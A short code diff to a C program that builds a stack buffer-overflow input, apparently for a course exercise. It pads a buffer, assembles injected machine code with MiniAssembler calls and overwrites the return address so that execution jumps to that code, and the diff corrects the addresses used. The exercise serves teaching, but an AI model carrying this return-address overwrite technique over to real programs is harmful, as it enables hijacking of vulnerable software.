@@ -24,10 +24,10 @@ int main(void) {
     fputc('!', fp);
 
     /* making our machine code*/
-    instruction[0] = MiniAssembler_adr(5, 0x420044, 0x42005f);
+    instruction[0] = MiniAssembler_adr(5, 0x420044, 0x420060);
     instruction[1] = MiniAssembler_mov(0, 65);
     instruction[2] = MiniAssembler_strb(0, 5);
-    instruction[3] = MiniAssembler_b(0x40089c, 0x42006f);
+    instruction[3] = MiniAssembler_b(0x40089c, 0x42006c);
 
     
     /* writing our machine code to the file */
@@ -39,8 +39,8 @@ int main(void) {
     for (i = 0; i < 26; i++) {
         fputc('!', fp);
     }
-/* overwriting the return address with 0x42005e, the start of our assembly code */
-    fputc(0x5e, fp);
+/* overwriting the return address with 0x420060, the start of our assembly code */
+    fputc(0x60, fp);
     fputc(0x00, fp);
     fputc(0x42, fp);
     fputc(0x00, fp);
